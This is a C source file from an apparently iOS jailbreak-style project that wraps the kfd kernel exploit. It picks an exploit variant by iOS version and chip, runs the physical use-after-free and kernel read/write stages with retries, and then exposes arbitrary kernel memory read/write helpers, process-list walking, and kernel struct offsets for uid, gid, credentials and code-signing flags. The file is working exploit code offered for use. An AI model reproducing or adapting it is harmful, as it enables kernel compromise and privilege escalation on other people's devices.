//
//  libkfd.c
//  meow
//
//  Created by doraaa on 2023/11/24.
//

#include "libkfd.h"

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"
#include "libkfd/krkw/IOSurface_shared.h"

#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

bool isarm64e(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if(ptrAuthVal != 0)
        return true;
    return false;
}

int isAvailable(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if (@available(iOS 17.0, *)) {
        return 16;
    }
    if (@available(iOS 16.4, *)) {
        if (isarm64e())
            return 15;
        return 14;
    }
    if (@available(iOS 16.2, *)) {
        if (isarm64e())
            return 13;
        return 12;
    }
    if (@available(iOS 16.0, *)) {
        if (isarm64e())
            return 11;
        return 10;
    }
    if (@available(iOS 15.4, *)) {
        if (isarm64e())
            return 9;
        return 8;
    }
    if (@available(iOS 15.2, *)) {
        if (isarm64e())
            return 7;
        return 6;
    }
    if (@available(iOS 15.1, *)) {
        if (isarm64e())
            return 5;
        return 4;
    }
    if (@available(iOS 14.5, *)) {
        return 3;
    }
    if (@available(iOS 14.0, *)) {
        return 2;
    }
    if (@available(iOS 13.5, *)) {
        return 1;
    }
    if (@available(iOS 13.0, *)) {
        return 0;
    }
    return -1;
}

struct kfd* kfd_init(uint64_t exploit_type) {
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, exploit_type);
    krkw_init(kfd);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd) {
    if(isarm64e() && kfd->info.env.vid >= 8)
        perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

uint64_t kopen(uint64_t exploit_type, uint64_t pplrw) {
    int fail = -1;
    
    struct kfd* kfd = kfd_init(exploit_type);
    
    kfd->info.env.exploit_type = exploit_type;
    kfd->info.env.pplrw = false;
    if(pplrw == 0)
        kfd->info.env.pplrw = true;

retry:
    puaf_run(kfd);
    
    fail = krkw_run(kfd);
    
    if(fail && (exploit_type != MEOW_EXPLOIT_SMITH)) {
        // TODO: fix memory leak
        puaf_free(kfd);
        info_free(kfd);
        bzero(kfd, sizeof(struct kfd));
        info_init(kfd);
        puaf_init(kfd, exploit_type);
        krkw_init(kfd);
        perf_init(kfd);
        goto retry;
    }
    
    info_run(kfd);
    if(isarm64e() && kfd->info.env.vid >= 10) {
        perf_run(kfd);
    } else {
        perf_ptov(kfd);
    }
    puaf_cleanup(kfd);
    
    return (uint64_t)(kfd);
}

void kread_kfd(uint64_t kfd, uint64_t va, void* ua, uint64_t size) {
    krkw_kread((struct kfd*)(kfd), va, ua, size);
}

void kwrite_kfd(uint64_t kfd, const void* ua, uint64_t va, uint64_t size) {
    krkw_kwrite((struct kfd*)(kfd), (void*)ua, va, size);
}

void kclose(uint64_t kfd) {
    kfd_free((struct kfd*)(kfd));
}

void kreadbuf_kfd(uint64_t va, void* ua, size_t size) {
    uint64_t *v32 = (uint64_t*) ua;
    
    while (size) {
        size_t bytesToRead = (size > 8) ? 8 : size;
        uint64_t value = kread64_kfd(va);
        va += 8;
        
        if (bytesToRead == 8) {
            *v32++ = value;
        } else {
            memcpy(ua, &value, bytesToRead);
        }
        
        size -= bytesToRead;
    }
}

void kwritebuf_kfd(uint64_t va, const void* ua, size_t size) {
    uint8_t *v8 = (uint8_t*) ua;
    
    while (size >= 8) {
        kwrite64_kfd(va, *(uint64_t*)v8);
        size -= 8;
        v8 += 8;
        va += 8;
    }
    
    if (size) {
        uint64_t val = kread64_kfd(va);
        memcpy(&val, v8, size);
        kwrite64_kfd(va, val);
    }
}

uint64_t kread64_kfd(uint64_t va) {
    uint64_t u;
    kread_kfd(_kfd, va, &u, 8);
    return u;
}

uint32_t kread32_kfd(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u32[0];
}

uint16_t kread16_kfd(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u16[0];
}

uint8_t kread8_kfd(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u8[0];
}

void kwrite64_kfd(uint64_t va, uint64_t val) {
    uint64_t u[1] = {};
    u[0] = val;
    kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
}

void kwrite32_kfd(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u32[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite16_kfd(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u16[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite8_kfd(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u8[0] = val;
    kwrite64_kfd(va, u.u64);
}

uint64_t kread64_ptr_kfd(uint64_t va) {
    uint64_t ptr = kread64_kfd(va);
    if ((ptr >> 55) & 1) {
        return ptr | 0xffffff8000000000;
    }

    return ptr;
}

//Thanks @jmpews
uint64_t kread64_smr_kfd(uint64_t va)
{
    uint64_t value = kread64_kfd(va) | 0xffffff8000000000;
    if((value & 0x400000000000) != 0)
        value &= 0xFFFFFFFFFFFFFFE0;
    return value;
}

uint64_t get_kernel_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

uint64_t get_kernel_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_task;
}

uint64_t get_current_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_proc;
}

uint64_t get_current_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_task;
}

uint64_t get_current_map(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_map;
}

uint64_t get_kernel_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

uint64_t get_current_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_pmap;
}

uint64_t get_kernel_map(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_map;
}

uint64_t get_kernel_ttbr0va(void) {
    return ((struct kfd*)_kfd)->info.kernel.ttbr[0].va;
}

uint64_t get_kernel_ttbr1va(void) {
    return ((struct kfd*)_kfd)->info.kernel.ttbr[1].va;
}

uint64_t get_kw_object_uaddr(void) {
    return ((struct kfd*)_kfd)->kwrite.krkw_object_uaddr;
}

uint64_t get_kernel_slide(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

uint64_t phystokv_kfd(uint64_t pa) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    return phystokv(kfd, pa);
}

uint64_t vtophys_kfd(uint64_t va) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    return vtophys(kfd, va);
}

uint64_t get_proc(pid_t target) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    uint64_t proc_kaddr = get_kernel_proc();
    while (true) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == target) {
            break;
        }
        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
    return proc_kaddr;
}

uint64_t off_pmap_tte = 0;
uint64_t off_proc_pfd = 0;

uint64_t off_fp_glob  = 0;
uint64_t off_fg_data  = 0;
uint64_t off_fd_cdir  = 0x20;

uint64_t off_task_itk_space         = 0;
uint64_t off_ipc_space_is_table     = 0;
uint64_t off_ipc_entry_ie_object    = 0;
uint64_t off_ipc_port_ip_kobject    = 0x48;

uint64_t off_p_csflags  = 0x1c;
uint64_t off_p_uid      = 0x2c;
uint64_t off_p_gid      = 0x30;
uint64_t off_p_ruid     = 0x34;
uint64_t off_p_rgid     = 0x38;
uint64_t off_proc_ucred = 0;
uint64_t off_proc_proc_ro    = 0x18;
uint64_t off_task_t_flags    = 0x3e8;
uint64_t off_p_ro_t_flags_ro = 0x78;
uint64_t off_p_ro_p_csflags  = 0x1c;

void offset_exporter(void) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    off_pmap_tte = static_offsetof(pmap, tte);
    off_proc_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
    
    off_fp_glob  = static_offsetof(fileproc, fp_glob);
    off_fg_data  = static_offsetof(fileglob, fg_data);
    
    off_task_itk_space = dynamic_offsetof(task, itk_space);
    off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
    off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
    
    if(kfd->info.env.vid <= 9) {
        off_proc_proc_ro        = 0x20;
    }
    if(kfd->info.env.vid <= 7) {
        off_ipc_port_ip_kobject = 0x58;
        off_p_csflags           = 0x300;
    }
    if(kfd->info.env.vid <= 5) {
        off_task_itk_space  = 0x330;
        off_proc_ucred      = 0xd8;
    }
}
